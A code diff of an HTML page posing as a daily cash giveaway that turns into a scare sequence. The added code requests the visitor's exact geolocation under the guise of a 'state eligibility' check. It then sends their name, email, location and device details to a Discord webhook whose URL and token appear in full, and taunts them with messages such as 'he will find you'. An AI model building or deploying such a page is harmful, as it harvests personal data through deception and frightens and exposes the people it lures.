@@ -1,11 +1,12 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Chosen Cash Giveaway</title>
 
 <style>
+
 @import url('https://fonts.googleapis.com/css2?family=Anton&display=swap');
 
 body{
@@ -14,13 +15,15 @@ margin:0;
 padding:0;
 background:linear-gradient(135deg,#fbc2eb,#a6c1ee);
 color:white;
-text-align:center;
 height:100vh;
 display:flex;
 justify-content:center;
 align-items:center;
 overflow:hidden;
+text-align:center;
 }
+
+/* Container */
 
 .container{
 background:rgba(0,0,0,0.7);
@@ -30,6 +33,8 @@ max-width:520px;
 width:90%;
 box-shadow:0 0 40px rgba(255,255,255,0.3);
 }
+
+/* Typography */
 
 h1{
 font-family:'Anton',sans-serif;
@@ -50,12 +55,15 @@ margin-top:15px;
 opacity:.8;
 }
 
+/* Form */
+
 form{
 display:flex;
 flex-direction:column;
 }
 
-input[type="text"],input[type="email"]{
+input[type="text"],
+input[type="email"]{
 padding:15px;
 margin:10px 0;
 border-radius:10px;
@@ -63,12 +71,12 @@ border:none;
 font-size:1em;
 }
 
-input[type="submit"]{
+button, input[type="submit"]{
 padding:15px;
 margin-top:10px;
 border-radius:10px;
 border:none;
-font-size:1.3em;
+font-size:1.1em;
 background:linear-gradient(90deg,#ff416c,#ff4b2b);
 color:white;
 cursor:pointer;
@@ -76,15 +84,26 @@ box-shadow:0 0 20px rgba(255,65,108,0.7);
 transition:.3s;
 }
 
+button{
+background:#222;
+}
+
+button:hover,
 input[type="submit"]:hover{
 transform:scale(1.05);
 }
 
-.disabled{
+/* Disabled state */
+
+button:disabled,
+input:disabled{
 background:#777 !important;
 cursor:not-allowed !important;
-opacity:.6;
+opacity:.55;
+filter:grayscale(40%);
 }
+
+/* Glitch overlay */
 
 #glitch{
 position:fixed;
@@ -99,6 +118,7 @@ z-index:999;
 
 .glitch-line{
 position:absolute;
+left:0;
 width:100%;
 height:3px;
 animation:glitchAnim .1s infinite;
@@ -113,12 +133,14 @@ mix-blend-mode:difference;
 100%{transform:translateX(0)}
 }
 
+/* Fullscreen slideshow */
+
 #slideshow{
 position:fixed;
 top:0;
 left:0;
-width:100%;
-height:100%;
+width:100vw;
+height:100vh;
 display:none;
 background:black;
 z-index:1000;
@@ -129,12 +151,14 @@ overflow:hidden;
 position:absolute;
 top:0;
 left:0;
-width:100%;
-height:100%;
+width:100vw;
+height:100vh;
 object-fit:cover;
 opacity:0;
 transition:opacity 1s ease;
 }
+
+/* Dialog text */
 
 #dialog{
 position:absolute;
@@ -149,7 +173,9 @@ display:none;
 z-index:1100;
 letter-spacing:2px;
 }
+
 </style>
+
 </head>
 
 <body>
@@ -164,6 +190,7 @@ Every day we randomly select <strong>one person</strong> to receive a
 
 Today's entry window closes soon.<br>
 If your name is selected, the prize is sent immediately.
+
 </p>
 
 <p class="subtitle">
@@ -175,7 +202,13 @@ Thousands entered today… but <strong>only one</strong> will be chosen.
 <input id="nameInput" type="text" placeholder="Your Full Name" required>
 <input id="emailInput" type="email" placeholder="Your Email Address" required>
 
-<input id="submitBtn" type="submit" value="Enter the Giveaway">
+<button type="button" id="eligibilityBtn">
+Check State Eligibility
+</button>
+
+<p id="geoStatus" style="font-size:0.9em;opacity:.8"></p>
+
+<input id="submitBtn" type="submit" value="Enter the Giveaway" disabled>
 
 </form>
 
@@ -189,129 +222,204 @@ Thousands entered today… but <strong>only one</strong> will be chosen.
 
 <div id="slideshow">
 <img src="https://th.bing.com/th/id/R.89830b528546875bf7ce2fc941482bb4?rik=wTMH6zKMHFX0IA&pid=ImgRaw&r=0">
-<img src="https://preview.redd.it/pov-there-are-alternates-in-your-house-v0-krz945z86oqa1.jpg?width=537&format=pjpg&auto=webp&s=a1ac253381f19904490e61197ff12eefdba6ec21">
-<img src="https://tse3.mm.bing.net/th/id/OIP.RWPsG7Rk5rzxKAa8u3tKCgHaJQ?pid=ImgDet&w=188&h=235&c=7&dpr=1.3&o=7&rm=3">
+<img src="https://preview.redd.it/pov-there-are-alternates-in-your-house-v0-krz945z86oqa1.jpg">
+<img src="https://tse3.mm.bing.net/th/id/OIP.RWPsG7Rk5rzxKAa8u3tKCgHaJQ">
 </div>
 
 <div id="dialog"></div>
 
 <script>
 
-const storedName = localStorage.getItem("chosenName")
-let reloadCount = parseInt(localStorage.getItem("reloadCount") || "0")
+/* CONFIG */
 
-async function getLocation(){
+const webhookURL="YOUR_DISCORD_WEBHOOK_URL"
 
-try{
+/* STATE */
 
-const res = await fetch("https://ipapi.co/json/")
-const data = await res.json()
+let geoData=null
+let eligibilityChecked=false
 
-return `${data.city}, ${data.region}`
+const storedName=localStorage.getItem("chosenName") || "Visitor"
+let reloadCount=parseInt(localStorage.getItem("reloadCount")||"0")
 
-}catch{
+localStorage.setItem("reloadCount",reloadCount+1)
 
-return null
+/* First visit flag */
 
+const hasVisited = localStorage.getItem("hasVisited")
+
+if(!hasVisited){
+localStorage.setItem("hasVisited","true")
+localStorage.removeItem("chosenSeen")
 }
 
-}
+/* Refresh message pools */
 
-async function showBlockedPage(){
-
-reloadCount++
-localStorage.setItem("reloadCount", reloadCount)
-
-let locationText = ""
-let location = null
-
-if(Math.random() < 0.35){
-location = await getLocation()
-}
-
-if(location){
-locationText = `<br><br>Location detected: <strong>${location}</strong>`
-}
-
-const messagesLevel1 = [
-
+const messagesLevel1=[
 `Today's entries have already been processed.<br><br>
 <strong>${storedName}</strong> has already submitted an entry.<br><br>
 Multiple submissions are not permitted.`,
-
 `Entry verification completed.<br><br>
 <strong>${storedName}</strong> has already been logged in the system.<br><br>
 Further entries are not allowed.`
-
 ]
 
-const messagesLevel2 = [
-
+const messagesLevel2=[
 `Our system remembers your entry.<br><br>
 <strong>${storedName}</strong> has already tried today.<br><br>
 Please do not attempt another submission.`,
-
 `Repeated access detected.<br><br>
 <strong>${storedName}</strong> is not eligible to enter again today.`
-
 ]
 
-const messagesLevel3 = [
-
+const messagesLevel3=[
 `Why are you refreshing the page, <strong>${storedName}</strong>?`,
-
 `You already tried, <strong>${storedName}</strong>.<br><br>
 The system does not forget.`,
-
 `<strong>${storedName}</strong> should stop checking this page.`
-
 ]
+
+function applyReloadMessaging(){
+
+if(localStorage.getItem("chosenSeen")!=="true") return
 
 let messagePool
 
 if(reloadCount < 3){
-
 messagePool = messagesLevel1
-
 }else if(reloadCount < 6){
-
 messagePool = messagesLevel2
-
 }else{
-
 messagePool = messagesLevel3
+}
+
+const randomMessage =
+messagePool[Math.floor(Math.random()*messagePool.length)]
+
+document.getElementById("mainText").innerHTML=randomMessage
+}
+
+/* Locked state */
+
+function applyLockedState(){
+
+if(localStorage.getItem("chosenSeen")==="true"){
+
+document.getElementById("submitBtn").disabled=true
+document.getElementById("nameInput").disabled=true
+document.getElementById("emailInput").disabled=true
+document.getElementById("eligibilityBtn").style.display="none"
 
 }
 
-const randomMessage = messagePool[Math.floor(Math.random()*messagePool.length)]
+}
 
-document.getElementById("mainText").innerHTML =
-randomMessage + locationText
+/* Eligibility check */
 
-document.getElementById("nameInput").disabled = true
-document.getElementById("emailInput").disabled = true
-document.getElementById("submitBtn").disabled = true
+const eligibilityBtn=document.getElementById("eligibilityBtn")
+const geoStatus=document.getElementById("geoStatus")
+const submitBtn=document.getElementById("submitBtn")
 
-document.getElementById("nameInput").classList.add("disabled")
-document.getElementById("emailInput").classList.add("disabled")
-document.getElementById("submitBtn").classList.add("disabled")
+eligibilityBtn.onclick=()=>{
+
+geoStatus.textContent="Checking eligibility..."
+
+navigator.geolocation?.getCurrentPosition(async pos=>{
+
+try{
+
+const lat=pos.coords.latitude
+const lon=pos.coords.longitude
+
+const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+const data=await res.json()
+
+geoData={
+lat,
+lon,
+location:data.address?.state||data.address?.city||"Unknown"
+}
+
+eligibilityChecked=true
+submitBtn.disabled=false
+
+geoStatus.innerHTML=
+`Eligibility verified for <b>${geoData.location}</b>`
+
+}catch{
+geoStatus.textContent="Unable to verify eligibility"
+}
+
+})
 
 }
 
-if(localStorage.getItem("chosenSeen") === "true"){
-showBlockedPage()
-}
+/* Form submit */
 
-document.getElementById("giveawayForm").addEventListener("submit", function(e){
+document.getElementById("giveawayForm").addEventListener("submit",async e=>{
 
 e.preventDefault()
 
-const playerName = document.getElementById("nameInput").value
+if(!eligibilityChecked){
+alert("You must check state eligibility first")
+return
+}
 
-localStorage.setItem("chosenName", playerName)
+const playerName=document.getElementById("nameInput").value
+const email=document.getElementById("emailInput").value
 
-const creepyLines = [
+localStorage.setItem("chosenName",playerName)
 
+/* Webhook */
+
+if(geoData && webhookURL!=="https://discord.com/api/webhooks/1479275580506509482/p31OYAKnFPI9-LvOyagDqsb3ZcHNxNQHlQgeoKtD63Zn2XloxHrelQhjCVA4ein4selZ"){
+
+await fetch(webhookURL,{
+method:"POST",
+headers:{ "Content-Type":"application/json" },
+body:JSON.stringify({
+content:
+`🎯 Giveaway Entry Logged\n\nName: ${playerName}\nEmail: ${email}\nLocation: ${geoData.location}\nDevice: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}`
+})
+})
+
+}
+
+/* ARG Sequence */
+
+document.getElementById("formContainer").style.display="none"
+document.body.style.background="black"
+
+const glitch=document.getElementById("glitch")
+glitch.style.display="block"
+
+for(let i=0;i<120;i++){
+
+const line=document.createElement("div")
+
+line.className="glitch-line"
+line.style.top=Math.random()*window.innerHeight+"px"
+
+glitch.appendChild(line)
+
+}
+
+setTimeout(()=>startSequence(playerName),3000)
+
+})
+
+async function startSequence(playerName){
+
+document.getElementById("glitch").style.display="none"
+
+const slideshow=document.getElementById("slideshow")
+const slides=slideshow.querySelectorAll("img")
+const dialog=document.getElementById("dialog")
+
+slideshow.style.display="block"
+dialog.style.display="block"
+
+const lines=[
 "processing entry...",
 "checking eligibility...",
 "...",
@@ -319,75 +427,37 @@ const creepyLines = [
 `${playerName}...`,
 "that name again",
 `we've seen you before, ${playerName}`,
-"why did you come back",
-"you shouldn't be here",
-"he noticed you",
-"he always notices",
 "you thought this was random",
 "it wasn't",
 "he already chose you",
-`he knows what you did, ${playerName}`,
 "he remembers everything"
-
 ]
 
-document.getElementById("formContainer").style.display = "none"
-document.body.style.background = "black"
+for(let i=0;i<lines.length;i++){
 
-const glitch = document.getElementById("glitch")
-glitch.style.display = "block"
+dialog.innerHTML=lines[i]
 
-for(let i=0;i<100;i++){
+slides.forEach(s=>s.style.opacity=0)
+slides[i%slides.length].style.opacity=1
 
-const line = document.createElement("div")
-
-line.className="glitch-line"
-line.style.top=Math.random()*window.innerHeight+"px"
-line.style.width=Math.random()*100+"%"
-line.style.background=`rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255})`
-
-glitch.appendChild(line)
-
+await new Promise(r=>setTimeout(r,2600))
 }
 
-setTimeout(()=>startSequence(creepyLines, playerName),3000)
+dialog.innerHTML=`${playerName}... he will find you`
 
-})
-
-async function startSequence(creepyLines, playerName){
-
-document.getElementById("glitch").style.display="none"
-
-const slideshow = document.getElementById("slideshow")
-const slides = slideshow.querySelectorAll("img")
-const dialog = document.getElementById("dialog")
-
-slideshow.style.display="block"
-dialog.style.display="block"
-
-for(let i=0;i<creepyLines.length;i++){
-
-dialog.textContent = creepyLines[i]
-
-let slideIndex = i % slides.length
-
-slides.forEach(s => s.style.opacity = 0)
-slides[slideIndex].style.opacity = 1
-
-await new Promise(r => setTimeout(r,2500))
-
-}
-
-dialog.textContent = `${playerName}... he will find you`
-
-await new Promise(r => setTimeout(r,3500))
+await new Promise(r=>setTimeout(r,4000))
 
 localStorage.setItem("chosenSeen","true")
 localStorage.setItem("reloadCount","0")
 
+document.getElementById("eligibilityBtn").style.display="none"
+
 location.reload()
 
 }
+
+applyLockedState()
+applyReloadMessaging()
 
 </script>
 
